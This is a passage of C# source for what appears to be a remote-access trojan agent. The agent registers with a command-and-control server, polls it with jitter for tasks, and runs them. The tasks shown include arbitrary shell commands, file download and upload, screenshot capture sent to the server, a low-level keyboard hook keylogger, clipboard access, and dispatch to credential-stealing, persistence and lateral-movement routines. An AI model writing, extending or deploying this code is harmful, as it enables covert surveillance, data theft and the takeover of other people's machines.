        {
            string status;
            if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass))
            {
                status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)";
                skipped++;
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                status = DeployWin(host, user, pass, self);
            }
            else
            {
                status = DeployUnix(host, user, pass, self);
            }
            lines.Add($"  {host}: {status}");
            if (status.StartsWith("deployed")) deployed++;
            else if (status.StartsWith("skipped")) skipped++;
            else failed++;
        }
        lines.Add($"lateral: deployed={deployed} failed={failed} skipped={skipped}");
        return (string.Join("\n", lines), 0);
    }

    // ----------------------------------------------------------------- tasks
    static (string, int) RunShell(string command, int timeoutSec)
    {
        var timeout = TimeSpan.FromSeconds(Math.Clamp(timeoutSec, 1, 3600));
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = RuntimeInformation.IsOSPlatform(OSPlatform.Windows)
                    ? "cmd.exe" : "/bin/sh",
                Arguments = RuntimeInformation.IsOSPlatform(OSPlatform.Windows)
                    ? $"/C {command}" : $"-c \"{command}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
            };
            using var p = Process.Start(psi)!;
            var stdoutTask = p.StandardOutput.ReadToEndAsync();
            var stderrTask = p.StandardError.ReadToEndAsync();
            if (!p.WaitForExit((int)timeout.TotalMilliseconds))
            {
                try { p.Kill(entireProcessTree: true); } catch { }
                p.WaitForExit(3000);
                return ("command timed out (" + timeoutSec + "s)", 124);
            }
            var outText = stdoutTask.GetAwaiter().GetResult() + stderrTask.GetAwaiter().GetResult();
            if (outText.Length > 12000)
            {
                int headSize = 2400;
                int tailSize = 12000 - headSize - 40;
                outText = outText[..headSize] +
                    $"\n... [{outText.Length - headSize - tailSize} chars truncated] ...\n" +
                    outText[^tailSize..];
            }
            return (outText, p.ExitCode);
        }
        catch (Exception e)
        {
            return ("error: " + e.Message, 1);
        }
    }

    static (string, int) Download(string taskId, Dictionary<string, string> args)
    {
        var name = args.GetValueOrDefault("file", "payload.bin");
        var dest = args.GetValueOrDefault("destination", name);
        try
        {
            var resp = Http.GetAsync(Server + "/api/files/" + taskId).GetAwaiter().GetResult();
            if (resp.StatusCode != HttpStatusCode.OK)
                return ($"download failed: HTTP {(int)resp.StatusCode}", 1);
            var bytes = resp.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult();

            if (Directory.Exists(dest)) dest = Path.Combine(dest, Path.GetFileName(name));
            var dir = Path.GetDirectoryName(Path.GetFullPath(dest));
            if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
            File.WriteAllBytes(dest, bytes);
            return ($"saved {bytes.Length} bytes to {dest}", 0);
        }
        catch (Exception e)
        {
            return ("error: " + e.Message, 1);
        }
    }

    static (string, int) Upload(string taskId, Dictionary<string, string> args)
    {
        var path = args.GetValueOrDefault("path", "");
        if (!File.Exists(path)) return ($"file not found: {path}", 1);
        try
        {
            using var form = new MultipartFormDataContent();
            var fileContent = new ByteArrayContent(File.ReadAllBytes(path));
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            form.Add(fileContent, "file", Path.GetFileName(path));
            var resp = Http.PostAsync(Server + "/api/files/" + taskId, form).GetAwaiter().GetResult();
            if (resp.StatusCode != HttpStatusCode.OK)
                return ($"upload failed: HTTP {(int)resp.StatusCode}", 1);
            return ($"uploaded {path}", 0);
        }
        catch (Exception e)
        {
            return ("error: " + e.Message, 1);
        }
    }

    static (string, int) Screenshot(string taskId, Dictionary<string, string> args)
    {
        var label = args.GetValueOrDefault("name", "screenshot");
        if (string.IsNullOrWhiteSpace(label)) label = "screenshot";
        string tmp = Path.Combine(Path.GetTempPath(), "c2shot_" + Environment.ProcessId + ".png");
        try
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                var tmpFwd = tmp.Replace('\\', '/');
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-command " +
                        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;" +
                        "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;" +
                        "$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);" +
                        "$g=[System.Drawing.Graphics]::FromImage($bmp);" +
                        $"$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);" +
                        $"$bmp.Save('{tmpFwd}');",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                };
                using var p = Process.Start(psi)!;
                p.WaitForExit(30000);
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            {
                using var p = Process.Start(new ProcessStartInfo { FileName = "screencapture", Arguments = $"-x \"{tmp}\"", UseShellExecute = false })!;
                p.WaitForExit(30000);
            }
            else
            {
                var run = new Func<string, bool>(c =>
                {
                    try
                    {
                        using var p = Process.Start(new ProcessStartInfo { FileName = "/bin/sh", Arguments = $"-c \"{c}\"", UseShellExecute = false })!;
                        p.WaitForExit(30000);
                        return p.ExitCode == 0;
                    }
                    catch { return false; }
                });
                if (!run($"(command -v import && import -window root \"{tmp}\") || (command -v scrot && scrot \"{tmp}\") || (command -v gnome-screenshot && gnome-screenshot -f \"{tmp}\")"))
                    return ("error: screenshot failed", 1);
            }

            if (!File.Exists(tmp) || new FileInfo(tmp).Length == 0)
            {
                try { File.Delete(tmp); } catch { }
                return ("error: screenshot failed", 1);
            }

            using var form = new MultipartFormDataContent();
            var fileContent = new ByteArrayContent(File.ReadAllBytes(tmp));
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
            form.Add(fileContent, "file", label + ".png");
            var resp = Http.PostAsync(Server + "/api/files/" + taskId, form).GetAwaiter().GetResult();
            try { File.Delete(tmp); } catch { }
            if (resp.StatusCode != HttpStatusCode.OK)
                return ($"screenshot upload failed: HTTP {(int)resp.StatusCode}", 1);
            return ($"screenshot saved ({label}.png)", 0);
        }
        catch (Exception e)
        {
            try { File.Delete(tmp); } catch { }
            return ("error: " + e.Message, 1);
        }
    }

    static ResultBody Execute(C2Task t)
    {
        var res = new ResultBody();
        switch (t.Type)
        {
            case "shell":
                var timeout = DefaultShellTimeout;
                if (int.TryParse(t.Args.GetValueOrDefault("timeout", ""), out var tSec) && tSec >= 1)
                    timeout = tSec;
                (res.Output, res.ExitCode) = RunShell(t.Args.GetValueOrDefault("command", ""), timeout);
                break;
            case "download":
                (res.Output, res.ExitCode) = Download(t.TaskId, t.Args);
                break;
            case "upload":
                (res.Output, res.ExitCode) = Upload(t.TaskId, t.Args);
                break;
            case "screenshot":
                (res.Output, res.ExitCode) = Screenshot(t.TaskId, t.Args);
                break;
            case "sleep":
                if (int.TryParse(t.Args.GetValueOrDefault("seconds", "10"), out var s) && s >= 1)
                    Interval = s;
                res.Output = $"heartbeat interval set to {Interval}s";
                break;
            case "keylog":
                var action = t.Args.GetValueOrDefault("action", "dump");
                res.Output = action switch
                {
                    "start" => KeylogStart(),
                    "stop" => KeylogStop(),
                    _ => KeylogDump()
                };
                break;
            case "clipboard":
                var clipAction = t.Args.GetValueOrDefault("action", "get");
                (res.Output, res.ExitCode) = clipAction == "set"
                    ? ClipboardSet(t.Args.GetValueOrDefault("text", ""))
                    : ClipboardGet();
                break;
            case "clone":
                (res.Output, res.ExitCode) = Clone(t.Args);
                break;
            case "steal":
                (res.Output, res.ExitCode) = Steal(t.TaskId, t.Args);
                break;
            case "persistence":
                (res.Output, res.ExitCode) = Persistence(t.Args);
                break;
            case "lateral":
                (res.Output, res.ExitCode) = Lateral(t.Args);
                break;
            case "exit":
                res.Output = "exiting";
                break;
            default:
                res.Output = "unknown task type: " + t.Type;
                res.ExitCode = 1;
                break;
        }
        return res;
    }

    // ------------------------------------------------------------------- main
    static void Main(string[] args)
    {
        string? server = null, token = null;
        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--server": server = args[++i]; break;
                case "--token": token = args[++i]; break;
                case "--interval": Interval = int.Parse(args[++i]); break;
                case "--jitter": Jitter = int.Parse(args[++i]); break;
                case "--state": StateFile = args[++i]; break;
                case "--verbose": Verbose = true; break;
            }
        }
        token ??= Environment.GetEnvironmentVariable("C2_TOKEN");
        if (server == null || string.IsNullOrEmpty(token))
        {
            Console.WriteLine("usage: agent --server URL --token TOKEN [--interval N] [--jitter N] [--verbose]");
            Console.WriteLine("(token also accepted via C2_TOKEN env var)");
            return;
        }
        Server = server.TrimEnd('/');
        Token = token;
        Http.DefaultRequestHeaders.Add("X-Agent-Token", token);

        LoadId();
        if (AgentId == "") Register();

        while (true)
        {
            try
            {
                foreach (var t in Checkin())
                {
                    Log($"running task {t.TaskId} ({t.Type})");
                    var res = Execute(t);
                    Report(t, res);
                    if (t.Type == "exit") return;
                }
            }
            catch (Exception e)
            {
                if (e is InvalidOperationException && e.Message.Contains("404"))
                {
                    Log("server does not know us — re-registering");
                    AgentId = "";
                    Register();
                }
                Log($"checkin failed: {e.Message}");
            }
            var jitterMs = Jitter > 0 ? Random.Shared.Next(0, Jitter * 1000) : 0;
            Thread.Sleep((Interval * 1000) + jitterMs);
        }
    }
}

static class NativeMethods
{
    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
        IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    public static extern short GetKeyState(int nVirtKey);
}
